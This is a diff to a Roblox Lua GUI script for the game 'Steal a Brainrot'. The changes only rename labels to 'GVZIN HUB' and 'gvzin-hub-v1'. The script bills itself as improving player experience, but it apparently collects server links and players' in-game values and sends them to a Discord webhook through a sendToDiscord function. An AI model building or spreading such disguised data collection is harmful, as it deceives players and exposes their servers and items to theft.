@@ -2,6 +2,7 @@
     Brainrot Experience GUI
     A clean, modern GUI for improving player experience in "Steal a Brainrot"
     Agora envia links para Discord via webhook
+    GVZIN HUB
 --]]
 
 local Players = game:GetService("Players")
@@ -56,7 +57,7 @@ topLabel.Name = "TopLabel"
 topLabel.Size = UDim2.new(1, 0, 0, 40)
 topLabel.Position = UDim2.new(0, 0, 0, 0)
 topLabel.BackgroundTransparency = 1
-topLabel.Text = "GVZIN HUB"
+topLabel.Text = "gvzin-hub-v1"
 topLabel.TextColor3 = Color3.fromRGB(70, 130, 180)
 topLabel.TextSize = 20
 topLabel.Font = Enum.Font.GothamBold
@@ -266,7 +267,7 @@ local function sendToDiscord(serverLink)
     end
     
     local payload = {
-        username = "Brainrot GUI",
+        username = "gvzin-hub-v1",
         avatar_url = "https://cdn.discordapp.com/embed/avatars/0.png",
         embeds = {{
             title = "Novo Link Coletado",
@@ -315,7 +316,7 @@ local function sendToDiscord(serverLink)
     end
 end
 
--- Helper function to get player's Brainrot value - CORRIGIDO
+-- Helper function to get player's Brainrot value
 local function getBrainrotValue()
     local brainrotValue = 0
     
